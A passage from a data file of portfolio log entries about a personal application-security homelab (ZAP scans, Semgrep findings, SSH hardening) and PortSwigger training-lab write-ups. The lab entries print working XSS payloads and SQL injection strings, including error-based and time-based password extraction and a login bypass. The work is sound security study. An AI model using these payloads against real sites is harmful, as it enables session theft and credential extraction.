      'CI/CD pipeline',
    ],
    links: [
      {
        label: 'First ZAP baseline report',
        url: '/zap-report.html',
      },
      {
        label: 'Second scan, after a first pass at the headers',
        url: '/zap-report-2.html',
      },
      {
        label: 'Third scan, final',
        url: '/zap-report-3.html',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-9-first-zap-scan',
    date: '2026-09-03',
    category: 'AppSec Homelab',
    title: 'First ZAP baseline scan',
    workedOn: [
      'Ran the first OWASP ZAP baseline scan against the app deployed on the mini PC, adding the DAST layer alongside Semgrep (SAST) and gitleaks (secrets)',
      'Read the first report: no high-risk findings, 2 medium and 6 low, all missing or weak response headers rather than active exploits',
      'Did a first pass at the headers in the nginx config and re-ran the same scan for a before and after: the clickjacking, content-type, and server-header findings are gone, and CSP is now present but still weak',
      "Worked through an scp mix-up caused by running the copy from inside the mini PC's own SSH session instead of a fresh Mac terminal",
    ],
    body: [
      'With the app deployed and running on the mini PC, I ran the first ZAP baseline scan against it: docker run -t -v $(pwd):/zap/wrk/:rw zaproxy/zap-stable zap-baseline.py -t http://192.168.88.13:8080 -r zap-report.html. That is the DAST layer, and the first time the three automated checks run end to end. Semgrep already covers SAST and gitleaks covers secrets.',
      "Getting the report back to my Mac tripped me up briefly. I ran scp from inside the mini PC's own SSH session rather than a fresh terminal on the Mac, so it tried to connect back to itself and write to a macOS path that does not exist on Linux. Re-running it from an actual Mac terminal pulled it through. Check hostname before running anything that depends on which machine you are actually on.",
      'The first report came back with no high-risk findings, which is expected for a baseline scan since it is passive only. It will not catch the SQL injection or broken access control I built into the app and already found by hand in Burp. What it flagged was all response headers: 2 medium and 6 low. The medium ones were no Content-Security-Policy and no anti-clickjacking header. The low ones were the missing Cross-Origin-Embedder-Policy, Cross-Origin-Opener-Policy, and Cross-Origin-Resource-Policy headers, no Permissions-Policy, a missing X-Content-Type-Options header, and the Server header leaking its version.',
      'I did a first pass at fixing these in the nginx config: added a Content-Security-Policy, an X-Frame-Options header, and X-Content-Type-Options, and turned off the Server version token. Then I re-ran the exact same scan. The second report is cleaner. The clickjacking, content-type, and server-header findings are gone. CSP moved from missing to two medium findings, because the policy I added leaves a directive undefined with no fallback and still allows inline styles. The three cross-origin headers and the Permissions-Policy header are still open.',
      'None of those are the injection bugs I planted. They are a different category, more about defense in depth and browser-level protections than direct exploitation, but they are still real findings and a good complement to the manual work.',
      'Where things stand: SAST, secrets scanning, and DAST are all working against a codebase I built and can walk through in detail. Both scans are in the repo now as a before and after. Next is to tighten the CSP so it has no undefined directives and drops unsafe-inline, add the cross-origin and permissions headers, and run a third pass.',
      'This is the part that ties the pipeline story together for the portfolio: manual testing in Burp plus three automated layers, all pointed at my own code. The scp mix-up was minor but it is another real troubleshooting moment worth keeping in the notes rather than smoothing over.',
    ],
    tools: ['OWASP ZAP', 'Docker', 'Semgrep', 'gitleaks'],
    tags: [
      'AppSec homelab',
      'DAST',
      'OWASP ZAP',
      'security headers',
      'CI/CD pipeline',
    ],
    links: [
      {
        label: 'First ZAP baseline report',
        url: '/zap-report.html',
      },
      {
        label: 'Second scan, after a first pass at the headers',
        url: '/zap-report-2.html',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-8-docker-deploy',
    date: '2026-09-03',
    category: 'AppSec Homelab',
    title: 'Docker deployment and a separate GitHub key',
    workedOn: [
      'Switched the mini PC to a text-only boot (multi-user.target) to free the RAM the desktop environment was using, and confirmed SSH still connects after the reboot',
      'Generated a dedicated SSH key on the mini PC for GitHub and registered it as its own key, so the mini PC and the Mac authenticate independently',
      'Cloned the appsec-homelab repo onto the mini PC and brought the app up with docker compose up -d --build',
      'Opened port 8080 through ufw scoped to the home subnet only (192.168.88.0/24), not a blanket allow',
    ],
    body: [
      'Picking up from yesterday. Three things I wanted done today: move the mini PC to a lighter headless boot, get a GitHub key set up on the box that is independent of my Mac, and get the vulnerable homelab app running in Docker on it.',
      'First, the boot target. sudo systemctl set-default multi-user.target && sudo reboot drops the desktop environment on boot and frees the RAM it was holding, which I want back for Docker and ZAP later. The thing to check afterwards was SSH, since there is no desktop to fall back on now if it does not come up. It reconnected cleanly.',
      "Second, the GitHub key. I overwrote my Mac's portfolio GitHub key by accident yesterday, so I was careful here not to touch the existing key pair between the Mac and the mini PC. I generated a fresh key directly on the mini PC and added its public key to GitHub as a separate registered key. Each machine now authenticates to GitHub on its own.",
      'Third, the app. git clone of the appsec-homelab repo, then docker compose up -d --build to build and start the containers in one step.',
      'Then the firewall rule to reach it: sudo ufw allow from 192.168.88.0/24 to any port 8080 proto tcp. I scoped this to my home subnet rather than allowing 8080 from anywhere. The app is intentionally vulnerable, so there is no reason for that port to be reachable from outside the local network, even by accident.',
      'Where things stand: the mini PC boots headless into a text console and runs Docker, and the homelab app is containerized and reachable on port 8080 from devices on my home network. Next is to confirm the app loads from my Mac, then start pointing OWASP ZAP at it for the DAST layer of the pipeline.',
      'The scoped ufw rule is a small thing, but it is the kind of default worth keeping visible in the eventual writeup. Running a deliberately vulnerable app on the network means being deliberate about what can reach it.',
    ],
    screenshots: ['Homelab/HomeLab2.webp'],
    tools: ['systemd', 'OpenSSH', 'Docker Compose', 'ufw', 'Git'],
    tags: [
      'AppSec homelab',
      'Linux',
      'Docker',
      'SSH',
      'ufw',
      'headless server',
    ],
  },
  {
    id: 'appsec-homelab-entry-7-mini-pc-setup',
    date: '2026-09-02',
    category: 'AppSec Homelab',
    title: 'Mini PC setup and SSH hardening',
    workedOn: [
      'Set up the mini PC (shipped with Linux Mint) as the base for the AppSec homelab, and decided to keep Mint rather than wipe to Ubuntu Server',
      'Diagnosed a "no signal" display fault after boot - turned out to be the HDMI cable, not GRUB or the graphics drivers',
      'Diagnosed SSH connection failures from my Mac - a stale IP address and the wrong username, not a network or firewall problem',
      'Hardened SSH: key-based auth only, password and root login disabled, ufw enabled, fail2ban installed',
      'Installed Docker on the mini PC over SSH from the Mac',
    ],
    body: [
      'The mini PC arrived today. It came with Linux Mint pre-installed and I decided to keep it rather than wipe to Ubuntu Server. It is Ubuntu underneath, so apt and Docker tooling are identical, and the only cost is a bit more overhead from the desktop environment. Most of the day went into troubleshooting rather than the hardening steps themselves.',
      'First boot got to the desktop and then the monitor lost signal entirely. I booted into the GRUB console (Shift or Esc at boot) to check for a corrupted bootloader: ls showed both partitions (hd0,gpt1 and hd0,gpt2) present and healthy, and grub.cfg was intact on gpt2, so the disk and GRUB were fine. I then suspected a graphics driver issue, since the signal dropped right as the desktop environment loaded, just after the login screen. That was also a dead end. It was the cable. Swapping HDMI for DisplayPort fixed it outright. Next time, check the cable before the drivers or GRUB.',
      'Then set up SSH on the mini PC, tried to connect from my Mac, and got connection timeouts followed by "no route to host". I confirmed the Mac and mini PC were on the same subnet (192.168.88.x), confirmed sshd was running (systemctl status ssh showed active), and confirmed ufw was not blocking it (inactive at the time). The real problem was the IP address: I was using 192.168.88.225, which was stale, and the current address was 192.168.88.13. On DHCP, re-check ip a fresh rather than trusting an address from a few minutes earlier.',
      'The other half of that was the username. I was trying to connect as charlesgoodsir, but the account on the mini PC is owner. Once corrected, ssh-copy-id and key-based login worked cleanly.',
      'Hardening done today: SSH key-based authentication set up with ssh-copy-id from the Mac; password authentication and root login disabled in sshd_config (PasswordAuthentication no, PermitRootLogin no); key-only login verified in a second terminal before closing the first, so I did not lock myself out; ufw installed and enabled with OpenSSH explicitly allowed; fail2ban installed and running.',
      'With key login working, installed Docker on the mini PC entirely over SSH from the Mac. No keyboard or monitor on the box from here.',
      'Still to do: a DHCP reservation on the router for 192.168.88.13 so the IP stops shifting, then deploy the homelab vulnerable app on this box and point OWASP ZAP at it to complete the DAST layer of the CI/CD pipeline.',
      'Most of today went on ruling out bootloader, driver, network, and firewall causes before landing on the simple ones: a bad cable, a stale IP, a wrong username. That is what the work usually looks like. Writing up the diagnosis path in the repo is worth more than a list of the commands that ran.',
    ],
    screenshots: ['Homelab/HomeLab1.webp'],
    tools: ['Linux Mint', 'GRUB', 'OpenSSH', 'ufw', 'fail2ban'],
    tags: [
      'AppSec homelab',
      'Linux',
      'SSH hardening',
      'ufw',
      'fail2ban',
      'troubleshooting',
    ],
  },
  {
    id: 'portswigger-xss-labs-6-8',
    date: '2026-09-02',
    category: 'PortSwigger Labs',
    title:
      'Cross-Site Scripting (XSS) labs 6-8 (jQuery sinks + encoded attribute)',
    workedOn: [
      'Kept going on the PortSwigger XSS path, Labs 6 through 11',
      'Labs 6 and 7: DOM XSS through jQuery sinks - an .attr() href sink and a hashchange selector sink',
      'Labs 8 to 10: reflected and stored XSS where the filter encodes angle brackets, so the way in is breaking out of an attribute or a JavaScript string',
      'Lab 11: first practitioner-level lab, DOM XSS through an AngularJS expression',
    ],
    body: [
      'More XSS today, and the labs move from the jQuery sinks into filters that encode angle brackets. Once a fresh tag is off the table, the pattern becomes: work out exactly what context the value lands in - an href, a JavaScript string, an Angular expression - and break out of that instead.',
      'Lab 7 was the long one. Getting an alert in the console was quick. Turning that into something that fires for another user meant working out how to make the hashchange event trigger on its own, which is where the exploit-server iframe comes in.',
      "Lab 11 is the first practitioner-level lab and the first time the target is a framework I do not use. It is an AngularJS app, and the payload works by reaching Angular's scope through $eval and the Function constructor. Did it as a code-along. The takeaway that stuck: moving into security means I cannot just know React and C# well, I need enough of a model of jQuery, AngularJS, and whatever else to spot where they go wrong.",
    ],
    labs: [
      {
        title:
          'Lab 6: DOM XSS in jQuery anchor href attribute sink using location.search source',
        notes: [
          'The vulnerable link is the "Back" link on the Submit Feedback form. There are a few back links around the site, but that is the only one actually labelled "back".',
          "The sink reads the returnPath query param and drops it straight into the href: $('#backLink').attr(\"href\", (new URLSearchParams(window.location.search)).get('returnPath')).",
          'Clicking the link normally just navigates to "/" via that value.',
          'The value lands inside the href attribute with no clean way to break out of it, so the move is to run JS inside the attribute with a javascript: URL instead.',
          'The lab wants document.cookie in the alert, so returnPath=javascript:alert(document.cookie). Loading that URL and clicking the Back link fires the alert and shows the DOM has been manipulated.',
        ],
        solution:
          '/feedback?returnPath=javascript:alert(document.cookie)\n\nSet as the returnPath param; the alert fires on clicking the Back link.',
        status: 'completed',
        screenshots: ['Burp/Lab6XSS.webp'],
      },
      {
        title:
          'Lab 7: DOM XSS in jQuery selector sink using a hashchange event',
        notes: [
          'On the blog. The hashchange handler decodes window.location.hash and concatenates it straight into a jQuery selector:',
          "$(window).on('hashchange', function(){ var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); if (post) post.get(0).scrollIntoView(); });",
          'Played with it in the console first. window.location.hash shows the hash; .slice(1) strips the leading #. Forgot the (1) on the first go and got an error, then it returned the raw value without the #.',
          'The selector looks for an h2 whose text contains the hash value, so a matching value scrolls the page to that heading.',
          'Passing an HTML string into :contains() makes jQuery build a detached element rather than match one. `$(\'section.blog-list h2:contains(<img src="0" onerror="alert()">)\')` returns a node even though nothing on the page matches it.',
          'Confirmed the detached element is live by setting myimg.src = 0 in the console, which fired a request that timed out with a 504.',
          'A real user will not change the hash by hand, so the payload has to trigger hashchange itself. Used the exploit server to deliver an iframe that appends to its own src after it loads:',
          '<iframe src="https://LAB-ID.web-security-academy.net/#" onload="this.src+=\'<img src=x onerror=print()>\'"></iframe>',
          'Tested it, confirmed print() fired, then delivered it to the victim.',
        ],
        solution:
          '<iframe src="https://LAB-ID.web-security-academy.net/#" onload="this.src+=\'<img src=x onerror=print()>\'"></iframe>\n\nDelivered from the exploit server.',
        status: 'completed',
        screenshots: ['Burp/Lab7XSS.webp', 'Burp/Lab7XSS2.webp'],
      },
      {
        title:
          'Lab 8: Reflected XSS into attribute with angle brackets HTML-encoded',
        notes: [
          'Uses the blog search box. Searching for p3p returns no results, but p3p shows up in the DOM inside the search form value attribute.',
          'Angle brackets come back HTML-encoded, so a new tag will not work. Quotes are not encoded, so the way in is to break out of the value attribute and add an event handler.',
          "p3p\" onmouseover='alert()' closes the attribute and adds an onmouseover. Hovering the search box fires the alert.",
        ],
        solution: "p3p\" onmouseover='alert()'",
        status: 'completed',
        screenshots: ['Burp/Lab8XSS.webp', 'Burp/Lab8XSS2.webp'],
      },
      {
        title:
          'Lab 9: Stored XSS into anchor href attribute with double quotes HTML-encoded',
        notes: [
          'First stored attack in this batch. The payload gets saved and sits there until another user triggers it, rather than firing on my own request.',
          "On the blog comment form, the website field is rendered back as the href of a link on the commenter's name, so other users can visit their site.",
          'Double quotes come back HTML-encoded, so breaking out of the attribute is off the table, but a javascript: URL still works as the href value.',
          'Put javascript:alert() in the website field. The alert fires when someone clicks the name link on the comment.',
        ],
        solution: 'javascript:alert()',
        status: 'completed',
        screenshots: ['Burp/Lab9XSS.webp', 'Burp/Lab9XSS2.webp'],
      },
      {
        title:
          'Lab 10: Reflected XSS into a JavaScript string with angle brackets HTML encoded',
        notes: [
          'The search term is reflected into a JavaScript string literal, not HTML:',
          "var searchTerms = 'p3p'; document.write('<img src=\"/resources/images/tracker.gif?searchTerms=' + encodeURIComponent(searchTerms) + '\">');",
          'Angle brackets are HTML-encoded so a new tag will not land, but the single quote is not encoded, so I can close the string and add my own code.',
          "Searched p3p'; alert(); and checked the DOM. The string closed cleanly and the alert call was sitting there as its own statement.",
          "Tidied it so the rest of the line stays valid JavaScript: p3p'; alert(); let cake = 'test re-opens a string for the trailing '; so nothing after it throws a syntax error.",
        ],
        solution:
          "p3p'; alert(); let cake = 'test\n\nAlso works as a self-contained break-in: '-alert()-'",
        status: 'completed',
        screenshots: ['Burp/Lab10XSS.webp'],
      },
      {
        title:
          'Lab 11: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded',
        notes: [
          'First practitioner-level lab, and the first one on a framework I do not use.',
          'The search box sits inside an AngularJS app. Tested {{ 1+1 }} and it rendered 2, so Angular is evaluating template expressions in the reflected value.',
          'Angle brackets and double quotes are both encoded, so the classic tag or attribute injection is blocked. The way in is an Angular expression that reaches back out to JavaScript.',
          "{{ $eval.constructor('alert()')() }} uses $eval's constructor (the Function constructor) to build a function that runs alert() and calls it.",
          'Did this one as a code-along. The part worth keeping: Angular expressions run against a scope, and $eval plus the Function constructor is the bridge from that scope back to normal JS. Something to come back to when I hit more sandbox-escape labs.',
        ],
        solution: "{{ $eval.constructor('alert()')() }}",
        status: 'completed',
        screenshots: ['Burp/Lab11XSS.webp'],
      },
    ],
    tools: ['Burp Suite', 'Web Browser', 'Chrome DevTools'],
    tags: [
      'XSS',
      'DOM XSS',
      'reflected XSS',
      'stored XSS',
      'jQuery',
      'AngularJS',
      'hashchange',
      'javascript: URI',
    ],
    links: [
      {
        label: 'Cross-site scripting (XSS)',
        url: 'https://portswigger.net/web-security/cross-site-scripting',
      },
    ],
  },
  {
    id: 'portswigger-xss-labs-2-5',
    date: '2026-09-01',
    category: 'PortSwigger Labs',
    title: 'Cross-Site Scripting (XSS) labs 2-5 (stored XSS + DOM XSS)',
    workedOn: [
      'Back into the PortSwigger XSS path after a holiday break - completed Labs 2 through 5',
      'Lab 2: stored XSS via a blog comment field with no output encoding',
      'Labs 3-5: DOM-based XSS through document.write and innerHTML sinks fed from location.search',
    ],
    body: [
      "Back from a long holiday and easing back into the PortSwigger labs and Burp while I wait on a mini PC to arrive - that one's going to become a Cyber home lab for standing up my own exploitable apps to practice against.",
      'Picking the XSS path back up from where I left off at Lab 1. Labs 2-5 move from a straightforward stored XSS into DOM-based XSS, where the bug lives entirely in client-side JavaScript handling the URL and the server never sees the payload.',
      'The through-line for the DOM labs: find the sink (document.write, innerHTML), work out how the URL feeds into it, then shape the payload to break out of whatever HTML context it lands in. innerHTML has its own quirk on top of that - a <script> tag assigned through it shows up in the DOM but never executes, so event handlers like onerror/onload have to do the work instead.',
    ],
    labs: [
      {
        title: 'Lab 2: Stored XSS into HTML context with nothing encoded',
        notes: [
          'The blog comment form stores input and renders it straight back into the page with nothing encoded.',
          'Tested with a plain <h1> tag first - refreshed the blog and the comment came back as a styled header, confirming HTML injection works here.',
          "Because it's stored, the <script> payload doesn't fire on submit - it triggers when the comments page is reloaded and the stored markup is served back.",
        ],
        solution:
          '<script>alert()</script>\n\nPosted as a blog comment; alert fires on reloading the comments page.',
        status: 'completed',
      },
      {
        title:
          'Lab 3: DOM XSS in document.write sink using source location.search',
        notes: [
          'First DOM-based lab - the payload never touches the server, the vulnerability is entirely in the client-side JS that handles the URL.',
          "Searching 'cake' returned no results, but the search term still got written into the page by trackSearch() via document.write().",
          "The sink: document.write('<img src=\"/resources/images/tracker.gif?searchTerms='+query+'\">') with query pulled straight from location.search.",
          'Breaking out of the src attribute with a double quote lets me add my own onload handler - the trailing quote isn\'t needed because the sink appends the closing "> itself.',
        ],
        solution: 'cake" onload="alert()',
        status: 'completed',
      },
      {
        title:
          'Lab 4: DOM XSS in document.write sink using source location.search inside a select element',
        notes: [
          'Same document.write sink as Lab 3, but the injection point is inside a <select> stock-checker, so the payload has to break out of the select/option elements first.',
          'The script reads storeId from the query string and writes it into <option selected>...</option>.',
          "Generic words like 'cake' didn't visibly register - used a unique value (p3p) so I could clearly see it land as the selected option in both the rendered dropdown and the DOM.",
          'Closed the select with </select>, then added an <img> with a broken src so onerror fires the alert. URL-encoded the whole thing so it survives in the query string.',
        ],
        solution:
          "?productId=1&storeId=p3p</select><img src='1' onerror='alert()'>\n\nURL-encoded:\n?productId=1&storeId=p3p%3C/select%3E%3Cimg%20src=%271%27%20onerror=%27alert()%27%3E",
        status: 'completed',
        screenshots: ['Burp/Lab4XSS.webp', 'Burp/Lab4XSS2.webp'],
      },
      {
        title: 'Lab 5: DOM XSS in innerHTML sink using source location.search',
        notes: [
          'Sink is element.innerHTML = query instead of document.write - doSearchQuery() drops the search term straight into <span id="searchMessage">.',
          "A <script> tag assigned via innerHTML shows up in the DOM but never runs - browsers don't execute script elements inserted that way.",
          'Used an <img> with an invalid src so the onerror handler runs instead - no need to touch the URL, typing it into the search box is enough.',
        ],
        solution: "<img src='0' onerror='alert()'>",
        status: 'completed',
        screenshots: ['Burp/Lab5XSS.webp'],
      },
    ],
    tools: ['Burp Suite', 'Web Browser', 'Chrome DevTools'],
    tags: [
      'XSS',
      'stored XSS',
      'DOM XSS',
      'document.write',
      'innerHTML',
      'JavaScript',
    ],
    links: [
      {
        label: 'Cross-site scripting (XSS)',
        url: 'https://portswigger.net/web-security/cross-site-scripting',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-6-documented-false-negative',
    date: '2026-08-06',
    category: 'AppSec Homelab',
    title: 'Leaving the AuthController SQLi as a documented false negative',
    workedOn: [
      'Reverted AuthController.cs back to its original, realistic [FromBody] login endpoint after the Entry 5 investigation',
      'Confirmed the SQL injection is still fully exploitable, and confirmed the pipeline still does not flag it',
      'Documented the gap directly in the repo README rather than changing the endpoint to make the pipeline look more complete than it is',
    ],
    body: [
      'Closing the loop from Entry 5. Reverted AuthController.cs back to its original [FromBody] LoginRequest shape - the realistic version of a login endpoint, not the [FromQuery] version used purely to isolate the cause.',
      "Rebuilt, re-ran, and confirmed administrator'-- still logs in as admin. The vulnerability was never in question - only whether Semgrep would see it, and it doesn't. Same pipeline, same rule, same file: ProductsController.cs still gets flagged, AuthController.cs still doesn't.",
      "Decided against changing the endpoint shape to force a green pipeline. The point of this repo is to show real vulnerabilities and real tool behaviour around them, not to optimise for a clean Actions run. Instead, added a note directly in the README calling out AuthController.cs as a known false negative, with a link back to the Entry 5 investigation explaining exactly why - so anyone reviewing the repo (or the pipeline output) understands it's a documented gap, not an oversight.",
    ],
    tools: ['Semgrep', '.NET / C#', 'GitHub Actions'],
    tags: ['AppSec homelab', 'SQL injection', 'Semgrep', 'SAST limitations'],
    links: [
      {
        label: 'appsec-homelab repo',
        url: 'https://github.com/charles-goodsir/appsec-homelab',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-5-semgrep-frombody-gap',
    date: '2026-08-06',
    category: 'AppSec Homelab',
    title: 'Why Semgrep caught one SQLi and missed the other',
    workedOn: [
      'Investigated why Semgrep flagged the SQL injection in ProductsController.cs but not the structurally identical one in AuthController.cs',
      'Ran Semgrep locally (CLI) against isolated versions of the file to test hypotheses one variable at a time',
      'Identified the root cause: the rule does not treat [FromBody]-bound request objects as a tainted source',
    ],
    body: [
      "This one's been parked since Entry 4 - Semgrep caught the SQLi in ProductsController.cs immediately but said nothing about the same pattern in AuthController.cs. Set out today to find out why instead of assuming it was a coverage gap.",
      'Installed Semgrep locally so I could test changes in seconds instead of pushing to GitHub Actions each time. First step was confirming a control: ran the same rule against ProductsController.cs alone, and it still flagged - so single-file scanning was a valid way to test this, not the cause of the mismatch itself.',
      'Then worked through the differences between the two files one at a time, changing exactly one thing per test and re-scanning:',
      "1. Property access - pulled request.Username/request.Password into plain local variables before interpolating them, in case Semgrep's taint tracking couldn't follow a property dereference. No change - still not flagged.",
      '2. Variable count - reduced the query to a single interpolated value instead of two, in case a multi-variable AND clause was the issue. No change.',
      "3. Clause style - swapped the equality check (Username = '...') for a LIKE '%...%' clause, matching ProductsController.cs's exact style. No change.",
      '4. Record position - moved the LoginRequest record declaration outside the class body, in case a nested record type was interfering with the method analysis. No change.',
      '5. Binding source - swapped [FromBody] LoginRequest request for two plain [FromQuery] string parameters, keeping the exact same SQL string. This one flagged immediately.',
      "That's the answer: Semgrep's csharp-sqli rule tracks taint from [FromQuery]/[FromRoute]-style parameters, but doesn't recognise a [FromBody]-bound complex object as a tainted source at all. It's not about how the SQL string is built - it's about whether the rule ever considers the input untrusted in the first place. Since request.Username never gets marked as tainted, nothing downstream matters, which is why every SQL-string-shaped test came back negative until the binding source itself changed.",
      "This is a real, meaningful gap rather than a quirk - POST-body JSON is the standard way virtually every modern REST API accepts login credentials, and it's exactly the shape that slipped past the default OWASP ruleset here. A GET-with-query-params endpoint doing the identical vulnerable thing gets caught instantly.",
      'Reverted AuthController.cs back to the original [FromBody] version afterwards - the whole point of this app is to keep the vulnerabilities in their most realistic form, and that includes keeping the miss visible for now rather than quietly changing the endpoint shape to make the pipeline look more complete than it is.',
    ],
    tools: ['Semgrep (CLI)', '.NET / C#'],
    tags: [
      'AppSec homelab',
      'SQL injection',
      'Semgrep',
      'SAST limitations',
      'taint analysis',
    ],
    links: [
      {
        label: 'appsec-homelab repo',
        url: 'https://github.com/charles-goodsir/appsec-homelab',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-4-first-pipeline-run',
    date: '2026-08-01',
    category: 'AppSec Homelab',
    title: 'Building the vulnerable app and running the first pipeline scan',
    workedOn: [
      'Built a bare-bones vulnerable-by-design app (.NET/C# backend, TypeScript/React frontend) to test what I learned in the PortSwigger SQLi and XSS labs',
      'Debugged the app from first build errors through to a working login and product search',
      'Manually confirmed the SQLi login bypass and reflected XSS both work as intended',
      'Added a GitHub Actions workflow running Semgrep, and fixed the first real finding it produced',
    ],
    body: [
      "Started today by testing out what I've learned from the labs with SQLi and XSS. Created a new repo specifically for an app that's deliberately vulnerable to these attacks - a bare-bones product search on the main page, with a login that can be bypassed via SQLi.",
      "Haven't done C# in a while, so this doubled as shaking off the cobwebs. Had some assistance from Claude to help jog my memory on different things. Hit a lot of errors getting it building for the first time - login didn't work, product search didn't work. Most were easy fixes once I found them: references not resolving, spelling mistakes, and issues connecting the backend to the frontend.",
      "Once it was up and running, I could test what I'd learned: logging in with administrator'-- and a random password logged me in as admin, and searching <img src=x onerror=alert(1)> triggered the alert. One thing the PortSwigger labs never show is what the code actually looks like behind a vulnerability like this - seeing the raw string concatenation that causes it was useful in a way reading about it isn't.",
      'After committing everything, I set up a GitHub Actions workflow with Semgrep to catch issues automatically. It picked up the SQL injection in ProductsController.cs immediately, which was great to see work. It did NOT flag the XSS in the frontend, though - something to dig into and tweak the ruleset for next time.',
      'The unexpected find was a second blocking issue, unrelated to the app itself: the workflow file was using a mutable actions/checkout@v4 tag rather than a pinned commit SHA, which Semgrep flagged as a supply chain risk (A03:2025 - Software Supply Chain Failures) - tags and branch refs can be silently repointed by the action owner, which is exactly how the trivy-action and kics-github-action compromises happened. Fixed it by pinning to the full SHA: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608 # v4.',
      "That's as far as I got this round. Next step is figuring out why the XSS didn't get flagged and tweaking the Semgrep config to catch it too.",
    ],
    tools: [
      '.NET / C#',
      'TypeScript',
      'React',
      'SQLite',
      'GitHub Actions',
      'Semgrep',
    ],
    tags: [
      'AppSec homelab',
      'SQL injection',
      'XSS',
      'CI/CD pipeline',
      'Semgrep',
      'software supply chain',
    ],
    links: [
      {
        label: 'appsec-homelab repo',
        url: 'https://github.com/charles-goodsir/appsec-homelab',
      },
    ],
    screenshots: [
      'Homelab/SQLiHomeLabDay1.webp',
      'Homelab/XSSHomeLabDay1.webp',
      'Homelab/WorkflowRunningDay1.webp',
      'Homelab/FirstWorkflowResultDay1.webp',
    ],
  },
  {
    id: 'portswigger-xss-labs-1',
    date: '2026-07-30',
    category: 'PortSwigger Labs',
    title: 'Cross-Site Scripting (XSS) lab 1 (reflected XSS)',
    workedOn: [
      'Started the PortSwigger Cross-Site Scripting (XSS) learning path',
      'Completed Lab 1: reflected XSS into an HTML context with nothing encoded',
    ],
    body: [
      'First attempt at XSS after finishing the SQL injection path. Different mental model to SQLi - instead of manipulating a database query, the goal is getting the browser itself to execute a script that gets reflected back into the page unencoded.',
      'Went in with a rough idea from JavaScript that a <script> tag triggers execution, but the specifics of what actually fires in a browser context took a bit of trial and error.',
    ],
    screenshots: ['Burp/Lab1XSS.webp'],
    labs: [
      {
        title: 'Lab 1: Reflected XSS into HTML context with nothing encoded',
        notes: [
          "Started with <script>alert</script> - failed. Referencing alert on its own doesn't call it, it just refers to the function.",
          'Realised alert needs to actually be invoked as a function call: <script>alert(1)</script> - this fired the alert and solved the lab.',
          'Takeaway: the payload needs to be valid, executable JavaScript, not just the presence of a <script> tag - the same rule as writing normal JS in a console.',
        ],
        solution: '<script>alert(1)</script>',
        status: 'completed',
      },
    ],
    tools: ['Web Browser', 'Burp Suite'],
    tags: ['XSS', 'reflected XSS', 'JavaScript'],
    links: [
      {
        label: 'Cross-site scripting (XSS)',
        url: 'https://portswigger.net/web-security/cross-site-scripting',
      },
    ],
  },
  {
    id: 'portswigger-sqli-path-complete',
    date: '2026-07-30',
    category: 'PortSwigger Labs',
    milestone: true,
    title: 'SQL Injection learning path: complete (Community Edition)',
    workedOn: [
      'Finished every SQL injection lab reachable on Burp Suite Community Edition',
      'Labs 15 and 16 remain blocked - both need Burp Collaborator, which is Professional-only',
    ],
    body: [
      'Closing out the SQL injection learning path for now. Went from basic WHERE-clause tautologies through UNION attacks on Oracle, MySQL, and PostgreSQL, blind SQLi via conditional responses, conditional errors, and time delays, and a WAF bypass using XML encoding via Hackvertor.',
      'Labs 15 and 16 need Burp Collaborator, which sits behind a Professional licence. Flagging them as blocked rather than skipping past quietly - revisiting once I upgrade or find a trial window.',
    ],
    screenshots: ['Burp/CompletedSQLiLabs.webp'],
    tools: [
      'Burp Suite',
      'Burp Proxy',
      'Burp Repeater',
      'Hackvertor extension',
      'Python',
    ],
    tags: ['SQL injection', 'milestone', 'PortSwigger Web Security Academy'],
    links: [
      {
        label: 'SQL injection labs',
        url: 'https://portswigger.net/web-security/sql-injection',
      },
    ],
  },

  {
    id: 'portswigger-sqli-labs-13-17',
    date: '2026-07-30',
    category: 'PortSwigger Labs',
    title:
      'SQL Injection labs 13-17 (error-based, time-based blind, WAF bypass)',
    workedOn: [
      'Completed labs 13, 14, and 17 on the PortSwigger SQL injection path',
      'Made partial progress on lab 14 (time-based blind) and could not attempt labs 15-16 (out-of-band) on Burp Community Edition',
      'Used CAST()-based error leakage, pg_sleep() time delays, and the Hackvertor extension to bypass a WAF filter',
    ],
    body: [
      'Final session on the SQLi learning path for now. This batch moved from straightforward UNION attacks into blind techniques that lean on errors, timing, and filter evasion rather than direct data output.',
      'Biggest takeaway: blind SQLi is a slower version of the same logic - confirm the injection point, find a reliable true/false signal (an error, a delay, a message), then automate the character-by-character extraction because doing it by hand does not scale past a couple of characters.',
    ],

    labs: [
      {
        title: 'Lab 13: Visible error-based SQL injection',
        notes: [
          'Adding a single quote to the trackingId broke the query and returned a verbose Postgres error, confirming the injection point and leaking the underlying query structure.',
          'Followed the CAST() technique from the code-along to force type-conversion errors that leak data back through the error message.',
          "' AND 1=CAST((SELECT username FROM users) as int)-- initially failed because the subquery returned more than one row.",
          "Adding LIMIT 1 fixed it: ' AND 1=CAST((SELECT username FROM users LIMIT 1) as int)-- leaked the first username directly in the Postgres error text.",
          'Repeated the same pattern against the password column to leak the credential.',
        ],
        solution:
          "' AND 1=CAST((SELECT password FROM users LIMIT 1) as int)--\n\nError message leaked the password directly.",
        status: 'completed',
      },
      {
        title:
          'Lab 14: Blind SQL injection with time delays and information retrieval',
        notes: [
          "Confirmed the injection with ' || pg_sleep(10)-- and timing the Repeater response - just over 10 seconds confirmed it.",
          "Built a conditional delay to ask true/false questions: ' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)-- - first attempt failed from a missing END keyword.",
          'Used the same CASE pattern to confirm the administrator account exists, then started narrowing the password length (>1, >10, >20 all returned a 10s delay, then >20 came back instantly).',
          "Burp Intruder isn't available on Community Edition, so full character-by-character extraction still needs to be scripted rather than done manually.",
        ],
        solution:
          'Scripted the rest of the password using the sqli_solver.py script.',
        status: 'completed',
        script: 'LabScripts/lab14.py',
      },
      {
        title: 'Lab 15: Blind SQL injection with out-of-band interaction',
        notes: [
          'This lab needs Burp Collaborator for out-of-band interactions, which is a Burp Suite Professional feature.',
          'Parking this until I can justify the licence cost or find a free trial window.',
        ],
        solution:
          'Not attempted - requires Burp Suite Professional (Collaborator/OAST). Revisiting once upgraded.',
        status: 'blocked',
      },
      {
